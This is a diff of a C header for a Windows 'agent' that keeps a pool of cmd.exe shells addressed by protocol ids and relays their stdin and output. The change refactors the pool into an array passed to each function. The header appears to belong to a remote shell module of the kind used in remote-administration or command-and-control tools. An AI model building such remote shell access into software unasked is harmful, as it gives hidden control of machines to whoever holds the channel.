@@ -26,16 +26,21 @@ typedef struct {
  * Returns 0 on success, non-zero on failure (handles already cleaned up). */
 int shell_spawn(shell_slot *slot);
 
+/* The shell pool is not static storage: agent_main() owns the array on
+ * its frame (which lives for the whole process) and passes it down.
+ * Every pool function takes the pool as its first argument. */
+#define SHELL_POOL shell_slot pool[SHELL_POOL_SIZE]
+
 /* Find a free pool slot, spawn cmd.exe into it, and return its index
  * (the protocol shell id). Returns -1 when the pool is full or the spawn
  * failed (the slot stays free either way). */
-int shell_open(void);
+int shell_open(shell_slot pool[]);
 
 /* Release everything a slot owns. Safe on a partially-filled slot. */
 void shell_teardown(shell_slot *slot);
 
 /* Map a protocol shell id to its slot, or NULL when never opened/closed. */
-shell_slot *shell_lookup(unsigned long long id);
+shell_slot *shell_lookup(shell_slot pool[], unsigned long long id);
 
 /* Feed bytes to the shell's stdin.
  * Returns 0 on success; on failure the shell is dead and torn down. */
@@ -55,4 +60,4 @@ int shell_read(shell_slot *slot, unsigned char *out, DWORD cap,
                DWORD *out_len);
 
 /* Tear down every live shell (agent shutdown - no orphaned cmd.exe). */
-void shell_teardown_all(void);
+void shell_teardown_all(shell_slot pool[]);
